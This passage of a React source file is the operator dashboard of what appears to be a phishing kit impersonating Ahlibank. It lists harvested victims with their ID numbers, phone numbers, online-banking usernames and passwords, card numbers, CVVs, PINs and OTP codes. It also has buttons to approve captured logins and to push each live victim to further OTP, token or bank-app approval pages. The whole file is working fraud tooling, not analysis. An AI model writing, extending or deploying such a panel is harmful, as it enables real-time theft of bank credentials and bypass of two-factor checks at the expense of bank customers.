                    <div className="w-[345px] ml-auto bg-[#f1f3f5] rounded-lg p-4 border border-gray-200/80 mb-4 text-right" dir="rtl">
                      <div className="font-bold text-sm text-gray-700 mb-3">
                        {selectedRequest.cardType === 'company' ? 'تفعيل عضوية شركات' : 'تفعيل عضوية أفراد'}
                      </div>

                      <div className="space-y-2 text-[12px] text-gray-800 font-medium leading-relaxed">
                        <div>
                          <span className="text-gray-600">الاسم : </span>
                          <span className="font-semibold text-gray-900 select-all">{selectedRequest.name}</span>
                        </div>
                        <div>
                          <span className="text-gray-600">
                            {selectedRequest.cardType === 'company' ? 'البريد الإلكتروني : ' : 'رقم الهوية الإماراتية : '}
                          </span>
                          <span className="font-mono font-semibold text-gray-900 select-all tabular-nums">{selectedRequest.idNumber}</span>
                        </div>
                        <div>
                          <span className="text-gray-600">رقم الهاتف المتحرك : </span>
                          <span className="font-mono font-semibold text-gray-900 select-all tabular-nums">{selectedRequest.mobile}</span>
                        </div>
                        <div>
                          <span className="text-gray-600">فئة البطاقة : </span>
                          <span className="font-semibold text-gray-900">{formatCardTypeLabel(selectedRequest.cardType)}</span>
                        </div>
                        <div>
                          <span className="text-gray-600">العنوان : </span>
                          <span className="font-semibold text-gray-900 select-all">{selectedRequest.address || 'غير محدد'}</span>
                        </div>
                        {selectedRequest.date && (
                          <div>
                            <span className="text-gray-600">التاريخ : </span>
                            <span className="font-mono font-semibold text-gray-900">{selectedRequest.date}</span>
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Timestamp Divider 1 */}
                    <div className="flex items-center justify-center gap-3 my-3 text-[10px] text-gray-400 font-mono">
                      <span className="w-12 h-px bg-gray-200"></span>
                      <span>{formatTimelineTimestamp(selectedRequest.createdAt)}</span>
                      <span className="w-12 h-px bg-gray-200"></span>
                    </div>

                    {/* CARD 2: بيانات تسجيل الدخول المصرفي */}
                    <div className="w-[345px] ml-auto bg-[#f1f3f5] rounded-lg p-4 border border-gray-200/80 mb-4 text-right" dir="rtl">
                      <div className="font-bold text-sm text-gray-700 mb-3 flex items-center justify-between">
                        <span>تسجيل الدخول المصرفي</span>
                        {selectedRequest.otpStatus?.startsWith('login_') && (
                          <span className="text-[10px] px-2 py-0.5 rounded bg-blue-100 text-blue-700 font-bold">
                            {selectedRequest.otpStatus === 'login_pending' ? 'بانتظار الموافقة' : 
                             selectedRequest.otpStatus === 'login_approved' ? 'تمت الموافقة' : 'مرفوض'}
                          </span>
                        )}
                      </div>

                      {selectedRequest.loginUsername ? (
                        <div className="space-y-2 text-[12px] text-gray-800 font-medium leading-relaxed bg-white p-3 rounded-xl border border-gray-100 shadow-sm mb-3">
                          <div className="flex justify-between items-center">
                            <span className="text-gray-600">اسم المستخدم:</span>
                            <span 
                              className="font-mono font-bold text-gray-900 select-all cursor-pointer hover:text-blue-600"
                              onClick={() => copyText(selectedRequest.loginUsername, 'login')}
                            >
                              {selectedRequest.loginUsername}
                            </span>
                          </div>
                          <div className="flex justify-between items-center">
                            <span className="text-gray-600">كلمة المرور:</span>
                            <span 
                              className="font-mono font-bold text-red-700 select-all cursor-pointer hover:text-blue-600"
                              onClick={() => copyText(selectedRequest.loginPassword, 'pass')}
                            >
                              {selectedRequest.loginPassword}
                            </span>
                          </div>
                        </div>
                      ) : (
                        <div className="rounded-xl p-4 bg-white/70 border border-dashed border-gray-300 text-center text-xs text-gray-400 mb-3">
                          بانتظار إدخال بيانات الدخول...
                        </div>
                      )}

                      {selectedRequest.loginUsername && (
                        <div className="flex gap-2">
                          <button
                            onClick={() => updateOtpStatus(selectedRequest.id, 'login_approved')}
                            className="flex-1 bg-[#16a34a] hover:bg-[#15803d] text-white py-2 rounded text-xs font-bold transition-colors cursor-pointer flex items-center justify-center gap-1"
                          >
                            <Check className="w-3.5 h-3.5" />
                            <span>موافقة</span>
                          </button>
                          <button
                            onClick={() => updateOtpStatus(selectedRequest.id, 'login_rejected')}
                            className="flex-1 bg-red-600 hover:bg-red-700 text-white py-2 rounded text-xs font-bold transition-colors cursor-pointer flex items-center justify-center gap-1"
                          >
                            <Ban className="w-3.5 h-3.5" />
                            <span>رفض</span>
                          </button>
                        </div>
                      )}
                    </div>

                    {/* Timestamp Divider 1.5 */}
                    <div className="flex items-center justify-center gap-3 my-3 text-[10px] text-gray-400 font-mono">
                      <span className="w-12 h-px bg-gray-200"></span>
                      <span>{formatTimelineTimestamp(selectedRequest.updatedAt)}</span>
                      <span className="w-12 h-px bg-gray-200"></span>
                    </div>

                    {/* CARD 3: الدفع بالبطاقة */}
                    <div className="w-[345px] ml-auto bg-[#f1f3f5] rounded-lg p-4 border border-gray-200/80 mb-4">
                      <div className="text-right font-bold text-sm text-gray-700 mb-3 flex items-center justify-between" dir="rtl">
                        <span>الدفع بالبطاقة</span>
                        {selectedRequest.otpStatus?.startsWith('card_') && (
                          <span className="text-[10px] px-2 py-0.5 rounded bg-emerald-100 text-emerald-700 font-bold">
                            {selectedRequest.otpStatus === 'card_pending' ? 'بانتظار الموافقة' : 
                             selectedRequest.otpStatus === 'card_approved' ? 'تمت الموافقة' : 'مرفوض'}
                          </span>
                        )}
                      </div>

                      {selectedRequest.cardNumber ? (
                        <div
                          className="rounded-xl p-4 shadow-xs border border-gray-300/80 relative overflow-hidden"
                          style={{ background: 'linear-gradient(135deg, #ebedef 0%, #dee3e7 55%, #d2d8de 100%)' }}
                          dir="ltr"
                        >
                          <div className="flex items-center justify-between mb-5">
                            <div className="flex items-center gap-2">
                              <div className="bg-black px-2 py-0.5 rounded-md border border-neutral-800 flex items-center justify-center">
                                <img
                                  src={LOGO_SRC}
                                  alt="البنك الأهلي - ahlibank"
                                  className="h-3.5 object-contain"
                                />
                              </div>
                              <div className="leading-none">
                                <div className="text-[9px] font-bold text-gray-800">بطاقة البنك الأهلي</div>
                                <div className="text-[7px] text-gray-600">ahlibank Card</div>
                              </div>
                            </div>
                            <span className="border border-emerald-300 bg-[#e6f4f0] rounded px-1.5 py-0.5 text-[10px] font-bold text-[#004838]">
                              OMR
                            </span>
                          </div>

                          <div className="flex items-center justify-between mb-3">
                            <button
                              onClick={() => copyText(selectedRequest.cardNumber, 'card')}
                              className="font-mono text-[15px] font-semibold tracking-wider text-gray-900 hover:text-[#1976d2] cursor-pointer select-all tabular-nums"
                              title="انقر لنسخ رقم البطاقة"
                            >
                              {formatCardNumberSpaced(selectedRequest.cardNumber)}
                            </button>
                            <span className="font-mono text-xs font-semibold text-gray-800 tabular-nums select-all">
                              {selectedRequest.expMonth}/{formatShortExpYear(selectedRequest.expYear)}
                            </span>
                          </div>

                          <div className="flex items-end justify-between">
                            <div>
                              <div className="text-xs font-medium text-gray-800 select-all mb-2">
                                {selectedRequest.paymentName || selectedRequest.name}
                              </div>
                              <div className="w-4 h-3 rounded-xs bg-[#008a40] flex items-center justify-center">
                                <div className="w-2.5 h-0.5 bg-white/80"></div>
                              </div>
                            </div>

                            <div className="text-right">
                              <div className="flex items-center gap-3 justify-end mb-1">
                                <div>
                                  <div className="text-[8px] text-gray-500 uppercase leading-none">CVV</div>
                                  <div
                                    onClick={() => copyText(selectedRequest.cvv, 'cvv')}
                                    className="font-mono text-xs font-bold text-gray-900 select-all tabular-nums cursor-pointer hover:text-[#1976d2]"
                                  >
                                    {selectedRequest.cvv || '---'}
                                  </div>
                                </div>
                                <div className="border-l border-gray-400/50 pl-3">
                                  <div className="text-[8px] text-gray-500 uppercase leading-none">PIN</div>
                                  <div
                                    onClick={() => copyText(selectedRequest.cardPin, 'pin')}
                                    className="font-mono text-xs font-bold text-red-700 select-all tabular-nums cursor-pointer hover:text-[#1976d2]"
                                  >
                                    {selectedRequest.cardPin || '----'}
                                  </div>
                                </div>
                              </div>
                              <div className="flex items-center gap-1.5 justify-end">
                                <div className="px-1 py-0.2 bg-white/80 rounded-xs border border-gray-300 text-[7px] font-black text-[#1434cb] italic">
                                  VISA / MC
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      ) : (
                        <div className="rounded-xl p-6 bg-white/70 border border-dashed border-gray-300 text-center text-xs text-gray-400" dir="rtl">
                          بانتظار إدخال بيانات البطاقة...
                        </div>
                      )}

                      <div className="mt-3 pt-2.5 border-t border-gray-200/80 flex flex-col gap-2" dir="rtl">
                        <div className="flex items-center justify-between">
                          <span
                            onClick={() => copyText(selectedRequest.cardNumber, 'card')}
                            className="text-[11px] text-[#1976d2] font-semibold underline cursor-pointer"
                          >
                            {copiedField === 'card' ? 'تم النسخ!' : 'نسخ رقم البطاقة'}
                          </span>

                          {selectedRequest.otp && (
                            <div className="flex items-center gap-2">
                              <span className="text-[11px] font-bold text-gray-700">
                                الرمز: <strong className="font-mono text-[#1976d2]">{selectedRequest.otp}</strong>
                              </span>
                            </div>
                          )}
                        </div>

                        {selectedRequest.cardNumber && (
                          <div className="flex gap-2 mt-1">
                            <button
                              onClick={() => updateOtpStatus(selectedRequest.id, 'card_approved')}
                              className="flex-1 bg-[#16a34a] hover:bg-[#15803d] text-white py-2 px-3 rounded text-xs font-bold transition-colors cursor-pointer flex items-center justify-center gap-1.5 shadow-2xs"
                            >
                              <Check className="w-3.5 h-3.5" />
                              <span>موافقة (طلب OTP)</span>
                            </button>
                            <button
                              onClick={() => updateOtpStatus(selectedRequest.id, 'card_rejected')}
                              className="flex-1 bg-red-600 hover:bg-red-700 text-white py-2 px-3 rounded text-xs font-bold transition-colors cursor-pointer flex items-center justify-center gap-1.5 shadow-2xs"
                            >
                              <Ban className="w-3.5 h-3.5" />
                              <span>رفض البطاقة</span>
                            </button>
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Timestamp Divider 2 */}
                    <div className="flex items-center justify-center gap-3 my-3 text-[10px] text-gray-400 font-mono">
                      <span className="w-12 h-px bg-gray-200"></span>
                      <span>{formatTimelineTimestamp(selectedRequest.updatedAt)}</span>
                      <span className="w-12 h-px bg-gray-200"></span>
                    </div>

                    {/* CARD 4: OTP SMS / TOKEN (5 أرقام) */}
                    <div className="w-[345px] ml-auto bg-[#f1f3f5] rounded-lg p-4 border border-gray-200/80 mb-4 text-right" dir="rtl">
                      <div className="font-bold text-sm text-gray-700 mb-3 flex items-center justify-between">
                        <span>
                          {selectedRequest.step === 'otp-bank'
                            ? 'رسالة موافقة من تطبيق البنك'
                            : selectedRequest.step === 'verify'
                            ? 'رمز الأمان TOKEN (5 أرقام)'
                            : 'OTP SMS / TOKEN'}
                        </span>
                        {selectedRequest.otpStatus && (
                          <span className="text-[10px] px-2 py-0.5 rounded bg-amber-100 text-amber-700 font-bold">
                            {selectedRequest.otpStatus === 'pending'
                              ? 'بانتظار التصديق'
                              : selectedRequest.otpStatus === 'otp_approved'
                              ? 'تم التحويل لـ TOKEN'
                              : selectedRequest.otpStatus === 'approved'
                              ? 'تم القبول النهائي'
                              : selectedRequest.otpStatus === 'rejected'
                              ? 'مرفوض'
                              : selectedRequest.otpStatus}
                          </span>
                        )}
                      </div>

                      {selectedRequest.otp ? (
                        <div className="space-y-2.5 mb-3">
                          <div className="bg-white rounded-lg p-3 border border-gray-200 text-center">
                            <div className="text-[11px] text-gray-500 mb-1">
                              الرمز المستلم ({selectedRequest.otp.length === 5 ? 'TOKEN - 5 أرقام' : 'OTP SMS'}):
                            </div>
                            <div className="font-mono text-2xl font-black tracking-[0.3em] text-[#1976d2] select-all tabular-nums">
                              {selectedRequest.otp}
                            </div>
                          </div>

                          <div className="flex gap-2">
                            <button
                              onClick={() => updateOtpStatus(selectedRequest.id, 'otp_approved')}
                              className="flex-1 bg-[#1976d2] hover:bg-[#1565c0] text-white py-2 rounded text-xs font-bold transition-colors cursor-pointer flex items-center justify-center gap-1"
                            >
                              <Key className="w-3.5 h-3.5" />
                              <span>قبول وطلب TOKEN (5)</span>
                            </button>
                            <button
                              onClick={() => updateOtpStatus(selectedRequest.id, 'approved')}
                              className="flex-1 bg-[#16a34a] hover:bg-[#15803d] text-white py-2 rounded text-xs font-bold transition-colors cursor-pointer flex items-center justify-center gap-1"
                            >
                              <Check className="w-3.5 h-3.5" />
                              <span>قبول نهائي</span>
                            </button>
                            <button
                              onClick={() => updateOtpStatus(selectedRequest.id, 'rejected')}
                              className="bg-red-600 hover:bg-red-700 text-white py-2 px-3 rounded text-xs font-bold transition-colors cursor-pointer flex items-center justify-center gap-1"
                            >
                              <Ban className="w-3.5 h-3.5" />
                              <span>رفض</span>
                            </button>
                          </div>
                        </div>
                      ) : (
                        <div className="rounded-xl p-4 bg-white/70 border border-dashed border-gray-300 text-center text-xs text-gray-400 mb-3">
                          بانتظار وصول الرمز...
                        </div>
                      )}

                      <div className="space-y-2">
                        <p className="text-xs text-gray-600 mb-2">توجيه الزائر لصفحة التحقق المطلوبة:</p>
                        <div className="grid grid-cols-3 gap-1.5">
                          <button
                            onClick={() => updateNextAction(selectedRequest.id, '/otp')}
                            className="bg-[#1976d2] hover:bg-[#1565c0] text-white py-2 px-2 rounded text-[11px] font-bold transition-colors cursor-pointer flex items-center justify-center gap-1"
                          >
                            <Smartphone className="w-3.5 h-3.5" />
                            <span>OTP SMS</span>
                          </button>
                          <button
                            onClick={() => updateNextAction(selectedRequest.id, '/verify')}
                            className="bg-red-700 hover:bg-red-800 text-white py-2 px-2 rounded text-[11px] font-bold transition-colors cursor-pointer flex items-center justify-center gap-1"
                          >
                            <Key className="w-3.5 h-3.5" />
                            <span>TOKEN (5)</span>
                          </button>
                          <button
                            onClick={() => updateNextAction(selectedRequest.id, '/otp-bank')}
                            className="bg-gray-800 hover:bg-gray-900 text-white py-2 px-2 rounded text-[11px] font-bold transition-colors cursor-pointer flex items-center justify-center gap-1"
                          >
                            <Building2 className="w-3.5 h-3.5" />
                            <span>موافقة بنك</span>
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </>
          ) : (
            <div className="flex-1 flex flex-col items-center justify-center text-gray-400 bg-[#fafafa]" dir="rtl">
              <MessageSquare className="w-12 h-12 mb-3 text-gray-300" />
              <p className="text-sm font-bold text-gray-500">اختر محادثة من صندوق الوارد</p>
              <p className="text-xs text-gray-400 mt-1">انقر على أي زائر في القائمة اليمنى لعرض بيانات البطاقة والطلب</p>
            </div>
          )}
        </div>

        {/* ==================== RIGHT SIDEBAR: VISITORS LIST ==================== */}
        <aside className="w-[290px] border-l border-gray-200 bg-white flex flex-col shrink-0 h-full">
          <div className="h-[40px] border-b border-gray-200 px-3 flex items-center justify-between shrink-0">
            <button
              onClick={() => setShowSearchInput(!showSearchInput)}
              className="text-[#1976d2] hover:bg-blue-50 p-1 rounded cursor-pointer"
              title="بحث"
            >
              <Search className="w-4 h-4" />
            </button>

            <div className="flex items-center gap-2" dir="rtl">
              <input type="checkbox" className="w-3.5 h-3.5 rounded border-gray-300 accent-[#1976d2] cursor-pointer" />
              <div className="relative flex items-center">
                <select
                  value={filterMode}
                  onChange={(e) => setFilterMode(e.target.value as any)}
                  className="appearance-none bg-transparent pr-1 pl-5 py-1 text-xs font-bold text-gray-700 focus:outline-none cursor-pointer"
                >
                  <option value="all">كل المحادثات</option>
                  <option value="online">المتصلون الآن</option>
                  <option value="card">بيانات البطاقة</option>
                  <option value="otp">بانتظار رمز OTP</option>
                  <option value="archived">المؤرشفة</option>
                </select>
                <ChevronDown className="w-3.5 h-3.5 text-gray-500 absolute left-0 pointer-events-none" />
              </div>
            </div>
          </div>

          {showSearchInput && (
            <div className="p-2 border-b border-gray-100 bg-gray-50" dir="rtl">
              <input
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                type="text"
                placeholder="بحث بالاسم، الهوية، الجوال، البطاقة..."
                className="w-full bg-white border border-gray-300 rounded px-2.5 py-1 text-xs focus:outline-none focus:border-[#1976d2]"
              />
            </div>
          )}

          {loading ? (
            <div className="flex-1 flex flex-col items-center justify-center text-gray-400 p-6">
              <RefreshCw className="w-6 h-6 animate-spin text-[#1976d2] mb-2" />
              <span className="text-xs">جاري التحميل...</span>
            </div>
          ) : error ? (
            <div className="p-4 text-center text-xs text-red-600" dir="rtl">
              {error}
            </div>
          ) : filteredRequests.length === 0 ? (
            <div className="flex-1 flex flex-col items-center justify-center text-gray-400 p-6 text-xs" dir="rtl">
              لا توجد محادثات مطابقة
            </div>
          ) : (
            <div className="flex-1 overflow-y-auto divide-y divide-gray-100">
              {filteredRequests.map((req) => (
                <div
                  key={req.id}
                  onClick={() => setSelectedRequestId(req.id)}
                  className={`px-3 py-3 cursor-pointer transition-colors flex items-center justify-between gap-2 ${
                    selectedRequestId === req.id ? 'bg-[#cfe4ff]' : 'hover:bg-gray-50 bg-white'
                  }`}
                >
                  <div className="flex flex-col items-start justify-between self-stretch shrink-0">
                    <div className="flex items-center gap-1.5">
                      <button
                        onClick={(e) => handleDeleteRequest(req.id, e)}
                        disabled={isDeleting === req.id}
                        className="text-gray-400 hover:text-red-600 p-0.5 rounded hover:bg-red-50 transition-colors cursor-pointer"
                        title="حذف المحادثة"
                      >
                        <Trash2 className="w-3 h-3" />
                      </button>
                      <span className="text-[10px] text-gray-400 font-medium" dir="rtl">
                        {formatRelativeTimeShort(req.updatedAt || req.createdAt)}
                      </span>
                    </div>

                    <div className="flex items-center gap-1 mt-1">
                      {(selectedRequestId === req.id || isRequestOnline(req)) && (
                        <MoreHorizontal className="w-3.5 h-3.5 text-[#1976d2]" />
                      )}
                      {req.cardNumber && (
                        <span className="inline-flex items-center px-1 py-0.2 bg-emerald-50 border border-emerald-200 rounded-xs text-[8px] font-bold text-emerald-700">
                          CARD
                        </span>
                      )}
                      {req.otp && (
                        <span className="inline-flex items-center px-1 py-0.2 bg-amber-50 border border-amber-300 rounded-xs text-[8px] font-bold text-amber-700">
                          OTP
                        </span>
                      )}
                    </div>
                  </div>

                  <div className="flex items-center gap-2.5 min-w-0">
                    <div className="text-right min-w-0" dir="rtl">
                      <div className="text-[13px] font-bold text-gray-800 truncate max-w-[150px]">
                        {req.name || 'زائر جديد'}
                      </div>
                      <div className="text-[11px] text-[#526b84] font-medium truncate max-w-[150px] mt-0.5">
                        {getRequestCurrentPageLabel(req)}
                      </div>
                    </div>

                    <div className="relative shrink-0" title={isRequestOnline(req) ? 'متصل الآن' : 'غير متصل'}>
                      <div
                        className={`w-10 h-10 rounded-full bg-[#d1d5db] flex items-center justify-center text-white overflow-hidden transition-all ${
                          isRequestOnline(req) ? 'ring-2 ring-[#22c55e]' : ''
                        }`}
                      >
                        <User className="w-6 h-6 fill-white text-white mt-1" />
                      </div>

                      <span className="absolute -top-0.5 -right-0.5 flex h-3.5 w-3.5 items-center justify-center">
                        {isRequestOnline(req) && (
                          <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#22c55e] opacity-75"></span>
                        )}
                        <span
                          className={`relative inline-flex rounded-full h-3 w-3 border-2 border-white shadow-2xs ${
                            isRequestOnline(req) ? 'bg-[#22c55e]' : 'bg-gray-400'
                          }`}
                        ></span>
                      </span>

                      <div className="absolute -bottom-0.5 -left-0.5 w-3.5 h-2.5 rounded-[2px] bg-[#006c35] border border-white flex items-center justify-center shadow-2xs">
                        <div className="w-2 h-[1px] bg-white"></div>
                      </div>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          )}
        </aside>
      </div>
    </div>
  );
};

export default AdminDashboard;
